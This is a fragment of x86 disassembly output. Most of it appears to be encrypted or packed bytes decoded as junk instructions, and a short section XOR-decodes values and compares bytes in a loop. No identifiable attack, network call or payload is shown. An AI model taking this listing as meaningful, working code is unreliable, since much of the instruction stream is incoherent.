  4049c0:	and    DWORD PTR [eax+0x70],esi
  4049c3:	cmp    eax,0x3b70707d
  4049c8:	and    esi,DWORD PTR [edx-0x38]
  4049cb:	push   ecx
  4049cc:	xchg   esi,eax
  4049cd:	xor    eax,0x3013ed2
  4049d2:	jmp    0xa04d:0xbb15dd8e
  4049d9:	and    esp,edx
  4049db:	daa    
  4049dc:	mov    eax,0x475bccf5
  4049e1:	mov    ah,0x1c
  4049e3:	fdiv   DWORD PTR [esi+0x31]
  4049e6:	xor    DWORD PTR [ecx+0x26],ecx
  4049e9:	pop    ecx
  4049ea:	pop    ds
  4049eb:	or     al,0xb8
  4049ed:	jp     0x4049d2
  4049ef:	imul   esp,DWORD PTR [ebx],0xa4fe2388
  4049f5:	rcl    BYTE PTR [edi+0x7],0xb0
  4049f9:	(bad)  
  4049fa:	jmp    0x902ef2ac
  4049ff:	enter  0xda24,0x55
  404a03:	bound  eax,QWORD PTR [ebx]
  404a05:	ret    0x1665
  404a08:	cmc    
  404a09:	mov    cl,0xb4
  404a0b:	add    DWORD PTR [ecx],ecx
  404a0d:	call   0x20f4e78d
  404a12:	fild   WORD PTR [edx+eax*8]
  404a15:	mov    bl,0x72
  404a17:	add    al,0xb7
  404a19:	xor    ebx,ecx
  404a1b:	jne    0x404a36
  404a1d:	punpcklbw mm1,mm1
  404a20:	push   es
  404a21:	jne    0x404a3b
  404a23:	pop    esp
  404a24:	mov    esp,0x5be7fccb
  404a29:	pop    edx
  404a2a:	bound  edi,QWORD PTR [eax-0x4ed3769f]
  404a30:	(bad)  
  404a31:	repz aas 
  404a33:	fild   WORD PTR [edi]
  404a35:	dec    ecx
  404a36:	popf   
  404a37:	or     eax,0x1f0b8286
  404a3c:	int    0x6e
  404a3e:	push   0x13f8a2d5
  404a43:	iret   
  404a44:	bound  esp,QWORD PTR [esi]
  404a46:	fstp   DWORD PTR es:[ebx-0x9db7909]
  404a4d:	push   ss
  404a4e:	pop    edx
  404a4f:	and    al,BYTE PTR [edx+edx*2-0xe3b791c]
  404a56:	and    BYTE PTR [ecx-0x27],ah
  404a59:	sbb    esp,ebx
  404a5b:	add    esi,edi
  404a5d:	cmp    eax,0x5d92b629
  404a62:	mov    eax,DWORD PTR [esi+0x3e]
  404a65:	pushf  
  404a66:	cmc    
  404a67:	imul   DWORD PTR [ecx+0x40f13162]
  404a6d:	xchg   ah,dl
  404a6f:	stos   DWORD PTR es:[edi],eax
  404a70:	jnp    0x404ada
  404a72:	mov    esi,0x3567e13e
  404a77:	and    esp,DWORD PTR [ebp+0x2]
  404a7a:	jns    0x404a9d
  404a7c:	sbb    bl,BYTE PTR [eax-0x28]
  404a7f:	cmp    eax,0xd9d06dc9
  404a84:	leave  
  404a85:	dec    ebx
  404a86:	pop    ds
  404a87:	mov    ebx,0xc43943ef
  404a8c:	cpuid  
  404a8e:	ficom  WORD PTR [eax+0x6b]
  404a91:	imul   eax,DWORD PTR [edi+0x45],0xffffffb5
  404a95:	pop    ds
  404a96:	int3   
  404a97:	push   edi
  404a98:	xor    BYTE PTR [ecx],ch
  404a9a:	data16 adc al,0x28
  404a9d:	(bad)  
  404a9f:	mov    cl,0x37
  404aa1:	(bad)  
  404aa2:	loopne 0x404a5d
  404aa4:	sbb    eax,0xbb27df01
  404aa9:	out    0x57,eax
  404aab:	(bad)  
  404aac:	mov    eax,0xbf980043
  404ab1:	shr    DWORD PTR [ebx-0x6],1
  404ab4:	adc    dl,dl
  404ab6:	pop    esi
  404ab7:	aaa    
  404ab8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ab9:	adc    esi,ebp
  404abb:	and    al,0xb3
  404abd:	push   esp
  404abe:	pop    esi
  404abf:	bound  ebx,QWORD PTR [edi-0x13]
  404ac2:	mov    al,ds:0x33d24b98
  404ac7:	mov    ds:0x2d50c205,al
  404acc:	or     ecx,ebp
  404ace:	leave  
  404acf:	xchg   BYTE PTR [ecx+0x1808e92e],dl
  404ad5:	jae    0x404a6e
  404ad7:	xchg   esp,eax
  404ad8:	mov    DWORD PTR [esi-0x1f],ebp
  404adb:	imul   edi,eax,0xe8cfd222
  404ae1:	fidiv  WORD PTR [eax+esi*4-0x7d]
  404ae5:	xor    eax,0xba3293a3
  404aea:	fist   DWORD PTR [ebp-0x33]
  404aed:	das    
  404aee:	scas   eax,DWORD PTR es:[edi]
  404aef:	lock test DWORD PTR [edx-0x7836dc86],0xa193756f
  404afa:	int3   
  404afb:	(bad)  
  404afc:	rcl    BYTE PTR [esi],1
  404afe:	and    dh,ch
  404b00:	xchg   BYTE PTR [ecx],bh
  404b02:	aaa    
  404b03:	cmp    dh,BYTE PTR [ebx+0x5433d483]
  404b09:	enter  0xa651,0x46
  404b0d:	push   esi
  404b0e:	xchg   dl,bl
  404b10:	mov    dl,0x1b
  404b12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b13:	mov    ah,BYTE PTR [edx-0x46]
  404b16:	cmp    BYTE PTR [esi],cl
  404b18:	cmp    edx,DWORD PTR [edi+ebp*2+0x20]
  404b1c:	jge    0x404b60
  404b1e:	mov    bl,BYTE PTR [edx-0x4bbf50b]
  404b24:	push   eax
  404b25:	xchg   BYTE PTR [ecx-0x29],bh
  404b28:	xor    dl,BYTE PTR [esp+edi*1]
  404b2b:	ss mov al,0x32
  404b2e:	dec    esi
  404b2f:	pop    esi
  404b30:	cmp    al,BYTE PTR [edx+ebp*8]
  404b33:	jmp    0xa022:0x30f0e9d3
  404b3a:	or     BYTE PTR [ebx],cl
  404b3c:	popa   
  404b3d:	xchg   BYTE PTR [ebx],bl
  404b3f:	dec    esp
  404b40:	mov    dh,bh
  404b42:	in     eax,0x4b
  404b44:	mov    ch,0xe5
  404b46:	pop    edx
  404b47:	xor    ecx,ebx
  404b49:	fidivr DWORD PTR [ebp+edi*4-0x3a]
  404b4d:	xchg   edx,eax
  404b4e:	dec    esi
  404b4f:	jmp    0x6a829a4e
  404b54:	sub    DWORD PTR [edi+esi*4+0x1],ebp
  404b58:	fist   WORD PTR [ecx+ebp*8+0x724dfaee]
  404b5f:	lds    edx,FWORD PTR [edx+0x628e465c]
  404b65:	sbb    bl,BYTE PTR ds:0x78e3b3cd
  404b6b:	mov    fs,WORD PTR [esi+0x576a1055]
  404b71:	mov    esp,esp
  404b73:	ret    
  404b74:	cli    
  404b75:	lods   eax,DWORD PTR ds:[esi]
  404b76:	jne    0x404b90
  404b78:	xchg   esp,eax
  404b79:	int    0x85
  404b7b:	dec    edi
  404b7c:	popa   
  404b7d:	out    0x3c,al
  404b7f:	inc    esi
  404b80:	cmp    ecx,DWORD PTR [eax+0x1be7120a]
  404b86:	inc    esi
  404b87:	xchg   al,cl
  404b89:	add    eax,0x11b82fc4
  404b8e:	add    BYTE PTR [ecx+0x3e],0x7
  404b92:	and    BYTE PTR [edi+edx*4+0x4d],bl
  404b96:	pushf  
  404b97:	mov    bh,0x69
  404b99:	enter  0x2f4b,0xc5
  404b9d:	loopne 0x404b56
  404b9f:	inc    esi
  404ba0:	mov    ebp,0xabd58b96
  404ba5:	mov    esp,0x1398a1cb
  404baa:	dec    ebx
  404bab:	or     dh,BYTE PTR [ecx+edi*4]
  404bae:	cmp    ch,BYTE PTR [eax-0x6503eb0d]
  404bb4:	outs   dx,DWORD PTR ds:[esi]
  404bb5:	push   0x43
  404bb7:	fwait
  404bb8:	inc    edi
  404bb9:	inc    ebp
  404bba:	mov    ebp,0xfcb597c9
  404bbf:	add    eax,0xb2ad3962
  404bc4:	inc    ebp
  404bc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bc6:	xchg   edx,eax
  404bc7:	retf   0x632e
  404bca:	ins    DWORD PTR es:[edi],dx
  404bcb:	cmc    
  404bcc:	not    DWORD PTR [ebp-0x66]
  404bcf:	adc    DWORD PTR [eax+0x30],0xffffffb7
  404bd3:	jg     0x404c1a
  404bd5:	adc    DWORD PTR [ecx-0x34],0xffffffc4
  404bd9:	mov    dl,0xf2
  404bdb:	in     al,dx
  404bdc:	mov    ecx,0x9ea82771
  404be1:	mov    BYTE PTR [ebx-0x7fffac16],bh
  404be7:	gs xchg ecx,eax
  404be9:	ret    
  404bea:	data16 sub al,0xdf
  404bed:	jo     0x404baf
  404bef:	mov    ebx,0x2c1ba51f
  404bf4:	push   ebp
  404bf5:	add    BYTE PTR [ebp+0x2a],0xbd
  404bf9:	rcl    DWORD PTR [edi+0x2d],1
  404bfc:	ror    DWORD PTR [edx+0x2c7f7c30],1
  404c02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c03:	in     eax,dx
  404c04:	jbe    0x404c0e
  404c06:	add    eax,0xf9ace7a5
  404c0b:	or     DWORD PTR [edx],esi
  404c0d:	mov    al,ds:0xe0e8140b
  404c12:	push   eax
  404c13:	push   ebp
  404c14:	add    al,0x2a
  404c16:	adc    al,0x96
  404c18:	push   ebx
  404c19:	ja     0x404c8a
  404c1b:	mov    al,0x4e
  404c1d:	xchg   edx,eax
  404c1e:	inc    BYTE PTR [ebp+0x2ddbcf6b]
  404c24:	lods   eax,DWORD PTR ds:[esi]
  404c25:	cmp    eax,edx
  404c27:	mov    al,ds:0x413cf89
  404c2c:	sahf   
  404c2d:	mov    eax,ds:0xb16ca6e0
  404c32:	mov    edx,DWORD PTR [ebx]
  404c34:	loope  0x404beb
  404c36:	mov    eax,edx
  404c38:	jmp    0x404c53
  404c3a:	and    bl,BYTE PTR ds:[esi+0x53]
  404c3e:	cli    
  404c3f:	xchg   BYTE PTR [ecx+0x1c],dh
  404c42:	push   ss
  404c43:	sub    edi,0x25
  404c46:	inc    ebx
  404c47:	cmp    DWORD PTR [edi],ecx
  404c49:	das    
  404c4a:	pop    ebp
  404c4b:	push   esi
  404c4c:	jnp    0x404c4a
  404c4e:	aaa    
  404c4f:	ror    ecx,1
  404c51:	cld    
  404c52:	and    BYTE PTR [ebx+0x5adc42e1],bh
  404c58:	mov    esi,0xec9ed2ef
  404c5d:	adc    ebx,edx
  404c5f:	mov    al,ds:0x3a41d931
  404c64:	cli    
  404c65:	dec    DWORD PTR [ebx+0x5c626c2f]
  404c6b:	push   ss
  404c6c:	push   ds
  404c6d:	icebp  
  404c6e:	adc    BYTE PTR [ebp+edi*4+0x736b8fa4],dh
  404c75:	add    al,0x10
  404c77:	dec    ecx
  404c78:	cmp    ecx,DWORD PTR [edi]
  404c7a:	xor    DWORD PTR ds:0xaea4bc1f,0x33db2349
  404c84:	sbb    eax,0xb5de1766
  404c89:	sub    esp,DWORD PTR [esi]
  404c8b:	mov    DWORD PTR [ebp-0x27],ecx
  404c8e:	mov    eax,ds:0x555afcd4
  404c93:	push   edx
  404c94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c95:	inc    edx
  404c96:	inc    esp
  404c97:	xor    eax,0x6a48105a
  404c9c:	mov    edx,0xf14eb55a
  404ca1:	push   ebp
  404ca2:	aad    0x2
  404ca4:	ja     0x404cea
  404ca6:	sbb    DWORD PTR [ebx],0xffffffdc
  404ca9:	adc    eax,0x7a12beab
  404cae:	mov    dh,0xb3
  404cb0:	mov    eax,ds:0x9f815e2f
  404cb5:	jle    0x404d27
  404cb7:	sbb    al,BYTE PTR [eax-0x1b]
  404cba:	push   esi
  404cbb:	xchg   esp,eax
  404cbc:	mov    ah,ah
  404cbe:	in     al,0x27
  404cc0:	shr    BYTE PTR [edx+0x716c25fe],1
  404cc6:	(bad)  
  404cc7:	xor    eax,0x56ff136d
  404ccc:	lock gs push eax
  404ccf:	or     cl,ah
  404cd1:	div    BYTE PTR [ecx+eax*2+0x14]
  404cd5:	js     0x404cdb
  404cd7:	mov    ah,ch
  404cd9:	pop    eax
  404cda:	mov    ch,0x16
  404cdc:	aam    0xd9
  404cde:	fsubrp st(2),st
  404ce0:	dec    ebp
  404ce1:	test   al,0x80
  404ce3:	pop    edi
  404ce4:	retf   
  404ce5:	fdecstp 
  404ce7:	jl     0x404d4b
  404ce9:	ror    DWORD PTR [ecx-0x7d],1
  404cec:	pop    ecx
  404ced:	fld    QWORD PTR [eax+edx*1-0x5ba6772d]
  404cf4:	ss ins BYTE PTR es:[edi],dx
  404cf6:	ins    DWORD PTR es:[edi],dx
  404cf7:	mov    ch,0xbd
  404cf9:	mov    dl,0x1a
  404cfb:	sbb    esp,DWORD PTR [eax]
  404cfd:	movnti DWORD PTR [ebp-0x23b5db94],ebx
  404d04:	ds mov ecx,0xf003a3b8
  404d0a:	add    eax,edi
  404d0c:	mov    DWORD PTR ds:0x42e77f,0xe58
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e76b,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax-0x5b]
  404d39:	add    al,0xc4
  404d3b:	pop    esp
  404d3c:	xchg   esi,eax
  404d3d:	cs jo  0x404db0
  404d40:	cmp    eax,0x3e70707d
  404d45:	adc    esp,DWORD PTR [edx+0x2a]
  404d48:	inc    esi
  404d49:	loop   0x404cf2
  404d4b:	xor    eax,0x53aae013
  404d50:	add    ebp,DWORD PTR [eax+0x66]
  404d53:	js     0x404d49
  404d55:	jbe    0x404cfa
  404d57:	js     0x404ceb
  404d59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d5a:	ds ins DWORD PTR es:[edi],dx
  404d5c:	jmp    0x404d08
  404d5e:	cmp    eax,0x2bb7766d
  404d63:	jno    0x404ddc
  404d65:	adc    dl,ah
  404d67:	test   BYTE PTR [edx],ah
  404d69:	and    DWORD PTR [ebx-0x71],ebx
  404d6c:	fs or  DWORD PTR ds:[ecx-0x65],0xffffffb0
  404d72:	in     al,dx
  404d73:	aad    0xaf
  404d75:	arpl   WORD PTR [ecx-0x1948c5e],sp
  404d7b:	int3   
  404d7c:	stc    
  404d7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d7e:	daa    
  404d7f:	jb     0x404d20
  404d81:	loopne 0x404d8e
  404d83:	sbb    DWORD PTR [edi],edx
  404d85:	mov    al,ds:0xc24ef428
  404d8a:	dec    esi
  404d8b:	pop    es
  404d8c:	shl    DWORD PTR [ebx+ecx*2],1
  404d8f:	mov    edx,?
  404d91:	xor    edx,DWORD PTR [ecx+0x15]
  404d94:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  404d96:	xchg   ebx,eax
  404d97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d98:	jne    0x404d57
  404d9a:	push   ds
  404d9b:	adc    DWORD PTR [esi+0x44],ecx
  404d9e:	jbe    0x404d8d
  404da0:	jne    0x404e1e
  404da2:	cmp    DWORD PTR [ebx+0x33],esi
  404da5:	dec    ebp
  404da6:	mov    dl,0xd6
  404da8:	mov    BYTE PTR [ebx-0x57],ch
  404dab:	lods   eax,DWORD PTR ds:[esi]
  404dac:	dec    edx
  404dad:	mov    cl,0x20
  404daf:	call   0x80b69f8c
  404db4:	dec    ecx
  404db5:	jl     0x404dde
  404db7:	add    ch,al
  404db9:	stos   BYTE PTR es:[edi],al
  404dba:	pop    esp
  404dbb:	push   esp
  404dbc:	xchg   esi,eax
  404dbd:	int3   
  404dbe:	cli    
  404dbf:	rol    ebp,cl
  404dc1:	mov    BYTE PTR [esi-0x72],ch
  404dc4:	sub    dh,BYTE PTR [ebx]
  404dc6:	xlat   BYTE PTR ds:[ebx]
  404dc7:	add    BYTE PTR [ebp-0x49],0xf5
  404dcb:	leave  
  404dcc:	push   0xd259d52d
  404dd1:	jnp    0x404e08
  404dd3:	mov    al,ds:0xf1bbb063
  404dd8:	sbb    eax,0xc1ceb5a5
  404ddd:	in     al,0x5c
  404ddf:	int    0xb
  404de1:	popf   
  404de2:	mov    bl,0x43
  404de4:	push   cs
  404de5:	mov    al,ds:0xf1fe4961
  404dea:	in     al,0x38
  404dec:	loop   0x404e5b
  404dee:	push   ds
  404def:	fdivr  QWORD PTR gs:[ecx+0x66]
  404df3:	xchg   DWORD PTR [esi],edx
  404df5:	pop    edx
  404df6:	jne    0x404dc3
  404df8:	icebp  
  404df9:	out    0x87,al
  404dfb:	jo     0x404d97
  404dfd:	mov    dl,0xe4
  404dff:	fwait
  404e00:	xchg   esi,eax
  404e01:	call   0x9026:0xf1b49c2
  404e08:	sbb    eax,0x336ba76
  404e0d:	pop    ds
  404e0e:	xchg   edx,eax
  404e0f:	enter  0x1b5a,0xb0
  404e13:	and    BYTE PTR [eax+edi*2+0x78cbd9ac],ch
  404e1a:	shr    BYTE PTR [edi+0x859dad6],1
  404e20:	sti    
  404e21:	pop    ds
  404e22:	cmp    al,0xb6
  404e24:	jp     0x404e15
  404e26:	leave  
  404e27:	sub    al,0x19
  404e29:	jecxz  0x404e87
  404e2b:	jne    0x404e2d
  404e2d:	clc    
  404e2e:	outs   dx,BYTE PTR ds:[esi]
  404e2f:	stc    
  404e30:	shr    BYTE PTR [ebx-0x1d],cl
  404e33:	sahf   
  404e34:	jl     0x404e8c
  404e36:	lds    ecx,FWORD PTR [esi+0x415ad237]
  404e3c:	dec    esp
  404e3d:	jmp    0x404ea9
  404e3f:	aad    0x9a
  404e41:	mov    dh,BYTE PTR [ecx]
  404e43:	sahf   
  404e44:	xchg   ebp,eax
  404e45:	cmp    edx,esi
  404e47:	shr    BYTE PTR [ecx],0xba
  404e4a:	pop    esi
  404e4b:	lds    esp,FWORD PTR [ecx]
  404e4d:	xchg   DWORD PTR [esi],ebp
  404e4f:	add    BYTE PTR ds:[edx+0x4],bl
  404e53:	inc    edx
  404e54:	test   BYTE PTR [eax-0x3a65d587],ch
  404e5a:	jne    0x404ec8
  404e5c:	mov    edi,0xc57b8af8
  404e61:	fcmovb st,st(3)
  404e64:	dec    edx
  404e65:	dec    esp
  404e66:	nop
  404e67:	pop    ss
  404e68:	ss dec edx
  404e6a:	sbb    al,0x79
  404e6c:	push   edx
  404e6d:	sub    bl,bl
  404e6f:	and    BYTE PTR ds:0x9764c270,dh
  404e75:	dec    eax
  404e76:	rcl    DWORD PTR [edi+0x21],cl
  404e79:	dec    edi
  404e7a:	into   
  404e7b:	ret    
  404e7c:	cmp    eax,0x14b1bb2f
  404e81:	mov    esi,0xa719d5a0
  404e86:	retf   
  404e87:	out    dx,al
  404e88:	xchg   BYTE PTR [edx],dl
  404e8a:	pusha  
  404e8b:	inc    esi
  404e8c:	mov    dl,0x2e
  404e8e:	(bad)  
  404e8f:	aaa    
  404e90:	shl    esi,0xe2
  404e93:	aaa    
  404e94:	mov    edi,0x3f48e6a8
  404e99:	xchg   esp,eax
  404e9a:	pop    ecx
  404e9c:	lock pop ebx
  404e9e:	mov    edx,0xf1b8b9e7
  404ea3:	ror    ebx,0x65
  404ea6:	mov    eax,ds:0xa80abb5d
  404eab:	jge    0x404e46
  404ead:	fsincos 
  404eaf:	out    0x5c,al
  404eb1:	mov    bl,0x78
  404eb3:	adc    dh,ah
  404eb5:	dec    ecx
  404eb6:	mov    cl,0xe8
  404eb8:	adc    al,0xa8
  404eba:	sbb    eax,0xd9d982ad
  404ebf:	int3   
  404ec0:	test   eax,0xf0353bd1
  404ec5:	adc    al,0xce
  404ec7:	xchg   ebx,eax
  404ec8:	sbb    al,0xbf
  404eca:	arpl   bp,ax
  404ecc:	add    al,bh
  404ece:	ins    BYTE PTR es:[edi],dx
  404ecf:	pusha  
  404ed0:	sub    eax,0xc24d71b6
  404ed5:	xor    al,BYTE PTR [edx]
  404ed7:	xchg   ebp,eax
  404ed8:	dec    esp
  404ed9:	mov    esi,0x5cc32e
  404ede:	fdivr  QWORD PTR [ebx+0x2b7f17b2]
  404ee4:	jmp    0xced2:0xe98cda77
  404eeb:	and    ah,dh
  404eed:	std    
  404eee:	sub    al,ah
  404ef0:	call   0x2756:0x78db25c3
  404ef7:	jmp    0xa9af:0x237bd2cc
  404efe:	ficomp DWORD PTR [ebp+0x18b26c57]
  404f04:	in     al,0xc4
  404f06:	mov    bh,0xcf
  404f08:	fistp  QWORD PTR [ecx+0x622e189b]
  404f0e:	pop    edi
  404f0f:	push   esi
  404f10:	out    dx,eax
  404f11:	fild   WORD PTR [ebp-0x2445cbb5]
  404f17:	mov    bl,0x3f
  404f19:	adc    al,0xe3
  404f1b:	or     eax,0xcd6ff22d
  404f20:	push   edx
  404f21:	lea    ebx,[eax+0x1]
  404f24:	adc    eax,0xc07a5c85
  404f29:	mov    DWORD PTR [edx+0x4a],ebx
  404f2c:	add    bh,BYTE PTR [esi-0x5e5923a4]
  404f32:	or     BYTE PTR [ebx-0x236da3cc],dh
  404f38:	popa   
  404f39:	push   edi
  404f3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f3b:	and    eax,0xcf817be9
  404f40:	mov    ds:0xfa32a4c1,al
  404f45:	mov    ebp,0x4cadcb10
  404f4a:	and    DWORD PTR [esi],esp
  404f4c:	and    bh,BYTE PTR [edx+0x3e]
  404f4f:	popa   
  404f50:	push   edi
  404f51:	pop    ecx
  404f52:	mov    dl,0x6c
  404f54:	inc    ecx
  404f55:	into   
  404f56:	mov    ebx,0x2e889d60
  404f5b:	(bad)  
  404f5c:	push   ss
  404f5d:	dec    ebx
  404f5e:	(bad)  
  404f5f:	into   
  404f60:	lahf   
  404f61:	div    BYTE PTR ds:0xb912524
  404f67:	and    al,0x3d
  404f69:	push   edx
  404f6a:	sub    al,0xb4
  404f6c:	rcl    BYTE PTR [edx+ebx*1+0x2d2a019],0x9a
  404f74:	imul   edx,DWORD PTR [edx-0x4805de50],0x62
  404f7b:	adc    BYTE PTR [ebx-0x3e],0x8d
  404f7f:	mov    al,0x39
  404f81:	enter  0x6837,0xbc
  404f85:	inc    edx
  404f86:	sbb    BYTE PTR [ecx+0x41],dl
  404f89:	xchg   BYTE PTR [edx],dh
  404f8b:	aaa    
  404f8c:	mov    esi,0x219e767e
  404f91:	adc    esi,DWORD PTR [ecx+0x1a2d6044]
  404f97:	mov    al,ds:0x66b8ec7
  404f9c:	push   ebp
  404f9d:	cmp    ecx,ecx
  404f9f:	mov    esp,0x989aed47
  404fa4:	aas    
  404fa5:	xchg   ecx,eax
  404fa6:	jo     0x404fea
  404fa8:	shr    BYTE PTR [eax+ebp*2-0x5f6f5dc0],0x91
  404fb0:	mov    ecx,0x9b7269e6
  404fb5:	wrmsr  
  404fb7:	sti    
  404fb8:	in     al,0x20
  404fba:	add    al,0x5d
  404fbc:	adc    ecx,DWORD PTR [ecx]
  404fbe:	add    eax,0x406a28e2
  404fc3:	int3   
  404fc4:	push   cs
  404fc5:	icebp  
  404fc6:	cld    
  404fc7:	cld    
  404fc8:	sbb    DWORD PTR [edx+0x328e6c91],ebx
  404fce:	fst    st(2)
  404fd0:	or     dh,BYTE PTR [esi]
  404fd2:	mov    ds:0x325891f6,al
  404fd7:	aam    0xa9
  404fd9:	pop    edi
  404fda:	jb     0x404fad
  404fdc:	xchg   ebx,eax
  404fdd:	xor    BYTE PTR [eax-0x7e],dl
  404fe0:	push   ebx
  404fe1:	iret   
  404fe2:	les    ecx,FWORD PTR es:[ebx+0x79a279a7]
  404fe9:	cmp    ecx,DWORD PTR [eax]
  404feb:	imul   ecx,edi,0x4df09b04
  404ff1:	rcl    DWORD PTR [esi],0x8e
  404ff4:	ret    
  404ff5:	push   esi
  404ff6:	mov    al,BYTE PTR [esi+eiz*8+0x53a8d616]
  404ffd:	pop    ebp
  404ffe:	mov    al,0xeb
  405000:	jmp    0x6001:0x471affda
  405007:	clc    
  405008:	inc    edi
  405009:	retf   0x4cff
  40500c:	xchg   ebx,eax
  40500d:	mov    esp,0x4965e1b8
  405012:	mov    ecx,0xc1512b68
  405017:	adc    eax,0x4633eb99
  40501c:	lods   al,BYTE PTR ds:[esi]
  40501d:	or     dl,bh
  40501f:	mov    dl,BYTE PTR [ecx+0x128f375f]
  405025:	mov    WORD PTR [ebx-0x5f],?
  405028:	(bad)
  40502b:	pop    ebp
  40502c:	arpl   WORD PTR ds:0x6caf2820,sp
  405032:	xor    al,0x81
  405034:	xor    bl,BYTE PTR [ecx]
  405036:	and    eax,DWORD PTR [esi-0x6]
  405039:	int    0xbb
  40503b:	daa    
  40503c:	fldenv [edi]
  40503e:	hlt    
  40503f:	inc    esp
  405040:	add    dl,BYTE PTR ds:0xeb46c97d
  405046:	or     ah,BYTE PTR [esi]
  405048:	sub    BYTE PTR [edi+0x7],bl
  40504b:	scas   al,BYTE PTR es:[edi]
  40504c:	mov    ecx,0xf5723bb2
  405051:	mov    bl,0x9a
  405053:	into   
  405054:	call   0x7eb223c9
  405059:	xchg   ecx,eax
  40505a:	adc    al,0x21
  40505c:	retf   
  40505d:	not    BYTE PTR [ecx-0x39]
  405060:	jg     0x40503d
  405062:	jbe    0x4050bb
  405064:	nop
  405065:	and    DWORD PTR [ecx+0x50bf611e],ebp
  40506b:	mov    ds:0xb04d7893,al
  405070:	retf   0x55fd
  405073:	xchg   ebp,eax
  405074:	push   0x6f
  405076:	lods   eax,DWORD PTR ds:[esi]
  405077:	dec    esp
  405078:	sbb    eax,0xa092ff19
  40507d:	add    ah,BYTE PTR [edx-0x26]
  405080:	or     ah,ah
  405082:	call   0x458b:0xb6cc8010
  405089:	hlt    
  40508a:	inc    edx
  40508b:	cmp    edx,eax
  40508d:	jne    0x40493d
  405093:	pop    edi
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	shl    DWORD PTR [eax+ebx*1-0x27],0xd3
  405135:	push   ebx
  405136:	sub    esi,DWORD PTR [eax+0x70]
  405139:	cmp    eax,0x2670707d
  40513e:	iret   
  40513f:	aam    0x1a
  405141:	pop    edi
  405142:	pop    es
  405143:	pusha  
  405144:	sbb    DWORD PTR [edi],ebp
  405146:	rol    DWORD PTR [ebx-0x42],1
  405149:	push   cs
  40514a:	cmp    dl,BYTE PTR [ebp+0x79]
  40514d:	(bad)  
  40514f:	mov    al,ds:0xcc2f6e65
  405154:	mov    dl,0x54
  405156:	jmp    0x88e9da87
  40515b:	lds    eax,FWORD PTR [eax+0x1761d935]
  405161:	xor    BYTE PTR [esi+0x1e],dh
  405164:	jmp    0x4051b3
  405166:	push   edx
  405167:	sbb    DWORD PTR [ebx-0x55bca28d],0x19b3f4c0
  405171:	mov    ah,0x77
  405173:	stos   BYTE PTR es:[edi],al
  405174:	lock loop 0x40512c
  405177:	nop
  405178:	adc    cl,BYTE PTR [ebp-0xbfc8bf1]
  40517e:	xchg   esi,eax
  40517f:	and    dl,bh
  405181:	mov    ch,0xba
  405183:	jns    0x4051ab
  405185:	xor    dh,dh
  405187:	mov    bh,0x52
  405189:	xchg   ecx,eax
  40518a:	(bad)  
  40518c:	loope  0x4051d0
  40518e:	stc    
  40518f:	cwde   
  405190:	jg     0x405149
  405192:	or     al,0x85
  405194:	pop    es
  405195:	aad    0x75
  405197:	lods   eax,DWORD PTR ds:[esi]
  405198:	imul   al
  40519a:	shr    BYTE PTR [edi-0x43ea0e21],0x36
  4051a1:	mov    esp,0xfbe432ae
  4051a6:	jo     0x40512f
  4051a8:	inc    esp
  4051a9:	xor    dh,al
  4051ab:	lea    ecx,[ebp+0x55]
  4051ae:	pushw  0xfff6
  4051b1:	hlt    
  4051b2:	push   0x24
  4051b4:	setge  BYTE PTR [esi+0x2]
  4051b8:	jns    0x40520c
